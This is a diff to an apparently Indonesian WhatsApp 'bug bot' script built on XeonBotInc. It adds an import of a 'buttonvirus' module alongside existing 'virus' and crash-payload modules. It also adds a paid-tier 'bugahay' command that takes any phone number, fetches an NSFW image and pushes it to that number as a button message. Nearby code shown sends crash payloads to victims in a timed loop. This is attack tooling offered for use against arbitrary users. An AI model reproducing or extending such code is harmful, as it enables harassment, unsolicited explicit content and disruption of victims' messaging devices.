@@ -45,6 +45,7 @@ const audionye = fs.readFileSync('./y.mp3')
 const { ngazap } = require('./lib/ngazap')
 const { santedpc } = require('./lib/santedpc')
 const { buttonvirus2 } = require('./lib/buttonvirus2')
+const { buttonvirus } = require('./lib/buttonvirus')
 const { virus } = require('./lib/virus')
 const { buttonkal } = require('./lib/buttonkal')
 
@@ -753,6 +754,28 @@ await sleep(20)
 XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
 await sleep(10000)
 }
+break
+case 'bugahay' :
+if (!isPremium && !isCreator) return reply(mess.premi)
+if (!q) return reply(`Input salah\n(.bugahay <nomor> <titik> <jumlah>)\n\nContoh:\n.bugahay 628584297392.5`)
+m.reply(mess.wait)
+nom = q.split('.')[0]
+jumlah = q.split('.')[1]
+ waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
+ let bugahaybot = [
+ {buttonId: `bugahay`, buttonText: {displayText: xeonbutton}, type: 1},
+  {buttonId: `bugahay`, buttonText: {displayText: xeonbutton}, type: 1},
+  {buttonId: `bugahay`, buttonText: {displayText: xeonbutton}, type: 1},
+ ]
+let button4Messagess = {
+image: {url:waifudd.data.url},
+caption:`Kenneth Silently`,
+buttons: bugahaybot,
+headerType: 1
+} 
+ await XeonBotInc.sendMessage(`${nom}@s.whatsapp.net`, button4Messagess, { quoted: doc }).catch(err => {
+ return('Error!')
+})
 break
 case 'jagoanom' : {
 if (!isPremium && !isCreator) return
